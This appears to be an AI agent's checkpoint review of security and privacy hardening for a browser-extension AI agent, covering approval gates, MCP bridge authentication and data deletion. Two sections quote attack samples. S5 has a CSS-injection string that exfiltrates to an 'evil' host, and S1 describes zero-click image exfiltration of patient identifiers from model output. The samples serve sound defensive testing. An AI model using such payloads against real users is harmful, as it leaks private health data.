# Review: `hardening/prod-ready`, Checkpoint 1 (Phase 1: S1–S7)

| | |
|---|---|
| Branch | `hardening/prod-ready` (local only, never pushed) |
| Base | `5fe5227`: `origin/main` (`c64838b`) plus the 8 Phase A commits from `apty-agent-review-A-c65edcf.bundle`. See "Conflicts" for why. |
| Code head | `1868729`; the branch head is the next commit, which adds this file and STATUS |
| Build zip | `apty-agent-prod-phase1-1868729.zip`: a clean build of the branch head, `manifest.json` at the top |
| Git bundle | `apty-agent-prod-phase1-1868729.bundle`: `HEAD` and `refs/heads/hardening/prod-ready`, excluding `origin/main`. It carries the Phase A commits too, so it applies to `origin/main` as it is today. |
| Checksums | `SHA256SUMS.txt` |
| Naming | The zip and bundle are named after the code head, `1868729`, because a commit cannot contain its own hash. The branch head adds only this file and `docs/STATUS.md`, so the zip's code is the same. |
| Spec | [`docs/tasks/prod/`](docs/tasks/prod/00-rules.md) |

This file replaces the Phase A review; that text is in git history:
`git show 5fe5227:REVIEW.md`.

Nothing here was run against a real AI provider, a real tenant or the Chrome
Web Store. Browser tests ran in Chrome for Testing 145 (puppeteer's build,
because `/opt/pw-browsers/chromium` does not exist on this machine) against
a mock model, fixture pages and the real MCP daemon.

## Owner decisions (D1–D7)

You did not answer D1–D7; you wrote "go ahead and do all the fixes". The
prompt says a default applies only after "use defaults", so each default
below is applied **provisionally**, in one place that is easy to change.
Please confirm or change each one.

| ID | Decision | What Phase 1 did |
|---|---|---|
| D1 | Distribution | Nothing yet (Phase 2, R6). |
| D2 | Extension ID | Nothing yet (Phase 2, R7). The pinned ID is unchanged. |
| D3 | Skills in the store build | **Default applied:** imported skills keep working, and the model can no longer write a script and then run it. Sandboxed skill code is refused any write or `mkdir` under `skills/<name>/scripts/`, in `packages/browser-runtime/src/vm/skill-api.ts` (`assertNotScriptPath`). skill-creator ("Save as Skill") stays, but it now makes instruction-only skills. |
| D4 | Tab titles in Strict | **Default applied:** in Strict a tab or page description has no title and only the origin. `packages/browser-runtime/src/runtime/result-privacy.ts` (`strictPage`) and `context-privacy.ts`. |
| D5 | Licence | Nothing yet (Phase 2, R4). |
| D6 | Icon artwork | Nothing yet (Phase 2, R6). |
| D7 | Providers for PHI | **Default applied:** Settings warns for every provider. The list is `PHI_APPROVED_PROVIDERS` in `packages/agent-core/src/config/ai-providers.ts`; it is empty, so every provider shows the warning until you add names. |

## Commits

| Commit | Subject |
|---|---|
| `fc3ddb8` | docs(prod): save the production-readiness prompt and work packages |
| `e325a79` | fix(security): block zero-click image exfiltration from model output (S1) |
| `c13cc1b` | fix(privacy): send store:false on every OpenAI request (S2) |
| `0743ff9` | fix(types): name createAIProvider's return type (S2 follow-up) |
| `d37ed0c` | fix(privacy): delete the agent's session history with its conversation (S3) |
| `f5dc574` | fix(privacy): apply the URL and page-title policy to every tool result, context and MCP reply (S4) |
| `150beee` | fix(security): tighten the approval gate (S5) |
| `8d90442` | fix(security): mutually authenticate the MCP bridge (S6) |
| `d7fd177` | style: format the S5 changes |
| `a840c9f` | fix(agent): retry a rate limit or 5xx that happens before any output (S7) |
| `b8cf1b6` | fix(redaction): redact an unterminated sensitive value in truncated JSON (S7) |
| `06e8836` | fix(privacy): keep the page-world bridge off when settings can't be read (S7) |
| `3f1034b` | fix(runtime): stop the side panel and the worker overwriting each other's session state (S7) |
| `f64537f` | fix(worker): catch unhandled rejections and the listed promises (S7) |
| `c13054f` | fix(ui): explain network and offline failures; check who asks for chat images (S7) |
| `958bb4c` | feat(settings): warn that a provider must cover health data (S2/D7 default) |
| `ac5cab5` | fix(lint): write the tool groups as plain arrays; no assignment in test expressions |
| `1868729` | test(e2e): answer the application-deep approval; read capture events from the broadcast (S3/S5 setup) |
| (next) | docs: Checkpoint 1 review and status |

## Gates (Checkpoint 1)

`rm -rf apps/browser-extension/dist`, then
`tooling/scripts/verify-quiet.sh typecheck lint test audit build`:

```
✓ typecheck (8s)
✓ lint (1s)
✓ test (44s)
✓ audit (1s)
✓ build (13s)
```

Unit tests, before (base `5fe5227`) and after:

| Suite | Before | After |
|---|---|---|
| apty-debug-contract | 72 | 80 |
| agent-core | 265 | 271 |
| dom-snapshot | 395 | 395 |
| browser-runtime | 964 | 1069 |
| ui | 224 | 264 |
| browser-extension | 303 | 313 |
| mcp-bridge | 44 | 60 |
| tooling scripts (`node --test`) | 17 | 23 |

Three existing tests were deleted, because they covered only the dead
recording feature removed in S3. See S3.

Other gates:

```
npm run format:check            Checked 793 files. No fixes applied.
npm run audit:test-skips        ✓ every skipped test says why
npm run audit:any               ✓ 604 explicit any, none above the baseline (was 605)
npm run audit:docs-links        ✓ every relative link in the Markdown files resolves
npm run audit:architecture      ✓ No architecture-boundary violations found.
npm run audit:branding          ✓ No unreviewed AIPex branding found.
npm run validate:extension      ✓ manifest.json is valid and every referenced entrypoint file exists.
node tooling/scripts/check-extension-id.mjs   ✓ The manifest key yields the pinned Agent ID bpiondflhhdplemamgggcdajclmoeple
```

`npm run test:coverage` was run as `pnpm -r test:coverage --testTimeout=30000`
plus mcp-bridge's `test:coverage -- --testTimeout=30000`, per rule 10.
Every package passed its threshold:

| Package | Statements | Branches | Functions | Lines |
|---|---|---|---|---|
| apty-debug-contract | 85.45% | 78.84% | 93.18% | 88.02% |
| agent-core | 78.10% | 72.07% | 84.76% | 79.90% |
| dom-snapshot | 91.41% | 83.45% | 97.82% | 93.17% |
| browser-runtime | 54.14% | 50.79% | 58.37% | 54.07% |
| ui | 45.98% | 37.04% | 44.33% | 46.78% |
| browser-extension | 45.79% | 46.51% | 43.99% | 45.71% |
| mcp-bridge | 31.47% | 26.17% | 34.43% | 31.64% |

End-to-end suite (`npm run test:e2e`, after a clean build):

```
# tests 118
# pass 105
# fail 13
# cancelled 0
```

Every one of the 13 failures also fails, with the same error, when the same
file runs against the base build (`E2E_EXTENSION_DIR=<base dist>`):

| File | Failing tests | On the base build |
|---|---|---|
| `apty-client.e2e` | 5 (bridge, segments body ×2, 403 body, deny list) | same 5: "Chrome found nothing listening in the Apty Client" |
| `studio.e2e` | 2 (no bridge, working) | same 2 |
| `preflight.e2e` | 2 (all green, no bridge module) | same 2 |
| `a11y.e2e` | 2 (side panel chat, light and dark) | same 2: "View full response" button not found |
| `agent.e2e` | 2 (DOM Health after restart; create_new_tab A1) | same 2, see "Observed" |

An earlier full run (73 pass, 16 fail, 3 cancelled) overlapped a stray test
process of mine and is not counted. It did surface the two setup conflicts
in `frames.e2e` and `dom-health-apps.e2e` listed under "Conflicts".

Secret scan: TruffleHog 3.99.2 (Homebrew; the Docker daemon was not running),
`trufflehog git file://<repo> --since-commit 5fe5227 --branch hardening/prod-ready --no-verification`,
no exclude list: 344 chunks, **0 verified, 0 unverified**. The same scan is
repeated on the branch head that adds this file, before packaging.

## Work packages

Every "red" below means the new test was run against the code before the
change and failed. Browser tests were run red against a build of the base
(`5fe5227`) through `E2E_EXTENSION_DIR`.

### S1. Zero-click image exfiltration: done

- **CSP:** the extension-page CSP adds `img-src 'self' data: blob:; media-src 'self' data: blob:; frame-src 'none'`. Nothing legitimate needs remote media: sound effects use `AudioContext`, and fonts are local. `validate-manifest.mjs` fails without these directives, through the tested `tooling/scripts/csp-policy.mjs`.
- **Markdown sanitiser:** `Response` (chat, reasoning and tool output) appends a rehype step, `packages/ui/src/lib/safe-media.ts`, after Streamdown's own plugins:
  - It drops `link`, `iframe`, `object`, `embed`, `video`, `audio`, `source`, `style`, `script`, `base`, `meta` and SVG `image`/`use`.
  - It strips `srcset`, `poster` and `background`, plus any inline style containing `url(`, `image-set` or `@import`.
  - A remote `<img>` becomes `[alt text]`.
- **Image elements:** chat file parts, tool screenshots and prompt attachments render only `data:` or `blob:` images. Skill markdown and the evidence viewers already render text in `<pre>`. `image.tsx` and `web-preview.tsx` have no importers (R1).
- **Red, then green:**
  - Unit: on the base, 5 failed (markdown image, raw `<img>`, `<picture>`/`<source>` and others). Now 34 pass, plus file-part and screenshot tests.
  - e2e `exfiltration.e2e.test.mjs`: on the base, the attacker server received `/leak.png?d=PATIENT-NAME-MRN-123&f=md` and `&f=html`, and the CSP-only check failed too. On the new build, 2/2 pass.

### S2. OpenAI `store: false`: done (Settings warning applied as the D7 default)

- **Change:** a `wrapLanguageModel` middleware sets `providerOptions.openai.store = false` on every OpenAI request. Other providers are unchanged. `createAIProvider` gained an optional `fetch` so the test drives the real code path.
- **Red, then green:** the unit test records the request body. On the old code it failed with `expected undefined to be false`.
- **Fact difference:** `@ai-sdk/openai` 3.0.47 sends `store: openaiOptions.store`, which omits the field when it is unset, not `?? true`. OpenAI's Responses API then stores the request by default, so the Facts' conclusion holds. One targeted grep in the package's dist confirmed this.
- **Docs:** PRIVACY.md links each provider's own data policy; each link was checked with a request (HTTP 200).

### S3. Deleting what the agent stored: done

- **Purge:** `purgeStoredData` clears every agent session in `aipex-sessions` and removes `aipex_last_capture_event`.
- **Per-conversation delete:** deleting a conversation, the 7-day and 5-conversation retention, and opening an expired conversation each delete that conversation's agent session and any session forked from it.
- **Click recording:** it was dead (nothing sends `start-recording`), so `recording.ts` and its side-panel port are removed. The click echo still works, but no longer stores the element and refuses senders from other extensions.
- **Red, then green:**
  - Unit: 3 + 4 tests failed on the base and pass now.
  - e2e `stored-data.e2e.test.mjs`: on the base, "Timed out waiting for aipex-sessions to be empty" and "…alpha's session to be deleted". On the new build, 2/2 pass.
- **Deleted tests (dead code only):** three `message-router.test.ts` tests for `start-recording`/`stop-recording`.

### S4. Remaining privacy gaps: done

- **One filter for every tool result:** one wrapper over every registered tool's `invoke` (`tools/index.ts`) applies the policy to results for chat and MCP alike, through `result-privacy.ts`:
  - `applyUrlPolicy` is applied to every http(s) URL, whether in a field or inside text.
  - In Strict, a tab or page description loses its title and keeps only the origin (D4).
- **MCP replies:** they also get Phase A's tool-result redaction (`redactToolOutput`) in the current mode.
- **Attached contexts:** page and tab contexts get the same rules through a new agent option, `contextFormatter`. The chip the user sees stays readable.
- **PRIVACY.md:** the masking section is rewritten to match the code:
  - The "Masks" table now lists the actual key lists. A bare `name` key is not masked.
  - Page prose is sent in every mode.
  - URL paths are kept.
  - Checkbox and radio states are sent.
  - It says what MCP clients get.
  - The false row "websites a skill script requests" is removed. The sandbox only receives `console`, `fs` and `downloadFile`.
  - The Settings mode descriptions (en/zh) are corrected to match.
- **Red, then green:** unit tests per tool and mode. e2e `phi-fixture.e2e.test.mjs` uses a page at `?mrn=884213&dob=1961-04-02` titled "Jane Testpatient - Chart":
  - On the base, the model path and the MCP path both leaked all four needles.
  - On the new build, 2/2 pass. The MCP path uses the real daemon.

### S5. Approval gate: done

- **`run_console_command`:** never rememberable.
- **`computer`:** grants are stored per action class (`computer:type`, `:key`, `:click`, `:drag`), and the prompt starts with the class ("Typing:", "Click:" and so on). Grants stored under the old `computer` name no longer match, so users are asked again (fails safe).
- **CSS values:** `highlight_text_inline` and `highlight_element` accept only safe values (`tools/css-values.ts`). The injection string `red} body{background:url(https://evil/?d=x)} .a{` is rejected for all three parameters. A grep found no other tool that puts parameters into CSS or HTML.
- **Navigation:**
  - `create_new_tab` compares with the conversation's bound tab; with no bound tab it asks.
  - The long-URL rule counts path, query and fragment.
  - `switch_to_tab` to another origin asks.
  - `close_tab` asks, and can't be remembered, for a tab this conversation did not open.
- **DOM Health:** an `application-deep` run asks once per run, naming the mode and the page limit, and can't be remembered. The tool is shared by chat and MCP.
- **`fill_form`:** the prompt lists `- label: "value"`, with each value cut at 60 characters.
- **Skill runs:**
  - The prompt shows the first 12 lines and the arguments.
  - Skill downloads always show the save dialog.
  - D3 as above.
  - Built-in skill-creator files are now rewritten on every start, so updated text reaches existing installs. That change has no unit test: `skill-manager.ts` has none, and its `?raw` imports make one costly.
- **Red, then green:**
  - Unit: every rule failed on the base and passes now.
  - e2e (`agent.e2e.test.mjs`, "approval hardening (S5)"), all three red on the base and green now:
    - remembering a typing approval doesn't pre-approve a Delete click;
    - `run_console_command` asks every time and never offers "Allow on this site";
    - a deep DOM Health run asks once.

### S6. Mutually authenticated MCP bridge: done

- **Handshake:** the extension offers `apty-mcp.v1` and `apty-auth.hmac-v1`, never the token. It sends a nonce, and the daemon must answer with its own nonce and `HMAC-SHA256(token, "apty-mcp-auth/v1|daemon|nE|nD")`. Only then does the extension send its proof. The daemon registers the socket after checking that proof.
- **Signed calls:** every `tools/call` carries `seq` and an HMAC under a session key derived from both nonces. The extension refuses unsigned, mis-signed and replayed calls.
- **Allow-lists:** the daemon forwards only tools it publishes, and the extension refuses names outside the same list. `tooling/scripts/mcp-tool-names.test.mjs` keeps the two lists equal. As a result, `run_console_command`, which is not published, can no longer be called over MCP.
- **Grants:** scoped to `chat` or `mcp`. Settings shows which requester holds each grant and revokes per requester. Grants stored without a requester are ignored.
- **CLIs:** `browser-cli` and `apty-cli` never run `/entrypoint.sh`, and accept `BROWSER_CLI_WS_URL`/`AIPEX_WS_URL` only for `ws://127.0.0.1` or `ws://localhost`.
- **Test vectors:** both sides assert the same vectors, and the daemon proof was cross-checked with `openssl dgst -sha256 -hmac`.
- **Red, then green:**
  - Daemon: 6 failed, then green.
  - CLI: 5 failed (the remote URL was retried forever; `/entrypoint.sh` was spawned).
  - Extension: 16 failed.
  - e2e `mcp-impostor.e2e.test.mjs`: on the base, the extension connected (`{"success":true}`) and sent the token in the subprotocol. On the new build the impostor gets no token and no `auth/prove`, and its `tools/call` never runs. `mcp.e2e`, `phi-fixture` and the impostor test pass together against the real daemon.

### S7. Robustness: done

- **LLM retry:** the stream loop now runs inside the attempt loop. An attempt is retried only while nothing has reached the caller, and the session is rolled back so the user message isn't duplicated. The retry log carries only the code and the HTTP status.
  - Red unit test with the real `run()` and a fake model throwing 429: `expected 1 to be 2` calls, and nothing logged.
  - e2e `llm-retry.e2e.test.mjs`: one 429, then a reply. On the base: "No new reply". New build: pass.
- **Truncated JSON:** `{"password":"hunter2`, `{"data":{"access_token":"abc` and `{"client_secret": "s3cr` are now redacted, both by the JSON key pass and by the text pass, which had the same bug. 7 tests failed on the base. Recorded in DECISIONS.md.
- **Page hooks:** unreadable settings now mean the bridge is off (and unregistered if it was registered), and a URL that can't be parsed is not allowed. 4 failed on the base.
- **Session state:** one `chrome.storage.session` key per context (`:page` or `:worker`). A failed write or read is logged as a code plus the key, and `flush()` reports the outcome. 2 failed on the base.
- **Service worker:** `unhandledrejection` and `error` handlers log only the kind of error. The side-panel open on an icon click and the options open on install are caught. Red on the base.
- **Offline and network errors:** "Could not reach the AI provider…" or "You appear to be offline…", in en and zh. 6 failed on the base.
- **Sender checks:** `chat-images-listener` answers only this extension's own pages and service worker, and the capture-click echo checks the sender (S3). Red on the base.

## Not done, or partial

- **Phase 2 (R1–R9) and Phase 3:** not started, waiting for "approved" and then "continue".
- **D1–D7:** see above. D3, D4 and D7 are provisional.
- **Real-provider, real-tenant and Web Store checks:** not run.
- **The prompt's environment:** `/opt/pw-browsers/chromium` is absent here, so Chrome for Testing 145 from the puppeteer cache was used instead.
- **TruffleHog** ran from Homebrew, not Docker, because the Docker daemon was not running.

## Conflicts between the prompt and the repo

1. **Phase A was not on `origin/main`.** Rule 0 says to stop, and I did. You then said "go ahead", so the branch starts at the Phase A bundle's head (`5fe5227`, a fast-forward of `origin/main`) instead of `origin/main`. The checkpoint bundle carries those 8 commits too.
2. **Existing tests changed** because they asserted behaviour this prompt removes. In each case only the assertion that encoded the removed behaviour changed; everything else was kept.
   - `devtools.test.ts` "a remembered approval lets the next call … run without a prompt" is now "never offers to remember, and asks again".
   - `agent.e2e` "remembers 'Allow on this site' for that tool only…" (console) is now "never remembers run_console_command…".
   - `message-router.test.ts` "re-broadcasts and stores a captured click" is now "…without storing it".
   - `ws-mcp-server.test.ts` "sends the token only as a subprotocol…" is now "never sends the token…", and the reconnect test's protocol list changed the same way.
   - `daemon-server.test.ts`: the two dangerous-tool tests use `computer`, because `run_console_command` is no longer published.
3. **Setup-only changes, with assertions unchanged:**
   - `tab.test.ts`: a bound tab was added.
   - `core-tools.e2e` "finds and clicks an element, then reads the page": runs in Standard, because Strict now withholds the title it reads.
   - `stored-data-panel.test.tsx`, `skill.test.ts`, `dom-health.test.ts`: mocks for new modules.
   - `approval-grants-panel.test.tsx`: grants gained a `requester`.
   - `ws-mcp-server.test.ts`: helpers do the handshake and sign calls, and the 60 s timeout test waits for the tool to start.
   - `page-hooks-registration.test.ts`: a failing-read flag.
   - `frames.e2e` "captures a clicked element…" (2 tests): the helper listens for the broadcast `capture-click-event` instead of reading `aipex_last_capture_event`, which S3 removes as `S3.md` directs. Red on the new build, green on the old build before and after the change.
   - `dom-health-apps.e2e` "click-only application…" and "LN portal URL…": the helper clicks "Allow once" on the application-deep prompt S5 adds. Both timed out waiting on the new build. Afterwards: 15/15 on the new build, and 15/15 for the original test on the old build.
4. **Facts that differ from the code:**
   - S2: `store` is omitted rather than `true`.
   - S6: the daemon keeps the token-subprotocol path for its own clients, which is safe because only holders of the token use it, and an old extension can still connect to a new daemon. A new extension can't connect to an old daemon.
5. **Commits:**
   - `recording.ts`'s deletion landed in `0743ff9` (the S2 type fix) instead of the S3 commit, because it was already staged.
   - The S4 commit's first version picked up your untracked `browser-extension-wp1.zip`. I amended it out before anything else; the file is untouched on disk and now listed in `.git/info/exclude`.

## Observed, not changed

- Streamdown's own harden step shows every `data:` image in markdown as "[Image blocked: …]", before and after this work. Inline `[[screenshot:N]]` placeholders resolve to `data:` URLs, so they show as text in chat; tool screenshots still render.
- Strict keeps URL paths (`applyUrlPolicy`), so a record number in a path is sent. PRIVACY.md now says so.
- An unbalanced object or array under a sensitive key in truncated JSON is still left as it is. The prompt allows only the documented string fix.
- `run_application_dom_health_audit` in `application-safe` mode still navigates without asking. The prompt asked only for the clicking mode.
- Orphan agent sessions (a panel closed without "New chat", with no saved conversation) are removed only by the Settings purge.
- Two existing e2e tests fail independently of this work:
  - `agent.e2e` "audits DOM Health on a tab opened before the extension restarted": "Service worker did not start" on the base build too.
  - "an 'Allow on this site' for click does not cover create_new_tab…" is flaky: the attacker server sometimes logs a `/favicon.ico` from the tab an earlier test legitimately opened. It also fails on the base build.
- In this environment the fake Apty Client and Studio extensions never receive the Agent's external messages, so 9 Client/Studio/preflight e2e tests fail on the base build and on this branch alike. I did not investigate further; it looks environmental (Chrome for Testing 145 rather than the expected Chromium).
- The a11y e2e "side panel, a chat with a tool result…" fails on the base build too: it waits for a "View full response" button that never appears.
- Plugin errors in `aipex.ts` are still logged with the error object.

## Five-minute owner test, per work package

Build: `npm run build`, then load `apps/browser-extension/dist` unpacked in Chrome.

- **S1:** set a custom provider pointing at any OpenAI-compatible mock that replies `![x](https://example.com/x.png?d=TEST)`. In DevTools for the side panel, Network shows no request to example.com, and the chat shows `[x]`.
- **S2:** with an OpenAI key, send one message with DevTools open on the side panel. The request body to `api.openai.com/v1/responses` has `"store": false`.
- **S3:** chat once. Then Options → General → Stored data → Delete everything. In DevTools → Application → IndexedDB, `aipex-sessions` → `sessions` is empty.
- **S4:** with Strict on (the default), open `https://example.com/?mrn=123&dob=1961-01-01` and ask the agent "list my open tabs". In DevTools for the side panel, the request body sent to the provider shows `https://example.com` for that tab, with no title, no `mrn` and no `dob`.
- **S5:** on any page, ask the agent to run `document.title` in the console. The prompt has no "Allow on this site", and the next run asks again.
- **S6:** start `nc -l 9223`, set the MCP URL to `ws://127.0.0.1:9223/extension` and paste a token, then click Connect. The upgrade request `nc` prints has `Sec-WebSocket-Protocol: apty-mcp.v1, apty-auth.hmac-v1` and no token, and Connect fails. With the real daemon (`node apps/mcp-bridge/dist/daemon.js`) and its token, Connect succeeds.
- **S7:** go offline (DevTools → Network → Offline) and send a message. The chat says you appear to be offline.

## After you write "approved"

I will give the exact commands to fetch and verify the bundle, merge it
with `--ff-only`, push, and roll back with
`git revert <first>..<last>`. I will not push anything myself.
